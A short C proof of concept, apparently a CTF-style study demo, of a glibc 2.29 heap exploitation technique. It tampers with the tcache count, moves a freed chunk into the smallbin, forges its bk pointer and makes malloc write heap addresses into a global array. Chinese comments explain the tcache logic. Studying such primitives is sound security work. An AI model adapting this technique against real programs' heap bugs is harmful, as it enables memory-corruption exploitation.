// gcc small2tcache.c -o small2tcache -ggdb
// https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3673

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void fill_7(char *base, int size)
{
	int offset = (size - 0x20) / 0x10;
	*(base+offset) = '\x07';
}

int64_t target[4];

int main()
{	
	char *chunkA = (char *)malloc(0x300);
	char *tcache_perthread_struct = (char *)((int64_t)chunkA - 0x250);

	malloc(0x10);
	// 因為 tcache entry = NULL, 所以 malloc 不會從 tcache 拿
	// 因為 tcache count = 7   , 所以 free 不會到 tcache
	fill_7(tcache_perthread_struct, 0x310);
	free(chunkA);

	// move chunkA to small bin
	malloc(0x500);
	*(int64_t *)(chunkA+8) = (int64_t)(&target);
	target[2] = (int64_t)(chunkA) - 0x10;

	// smallbin attack
	// https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3673
	malloc(0x300);
	for(int i = 0; i<4; ++i)
		printf("target[%d] = 0x%lx\n", i, target[i]);
}
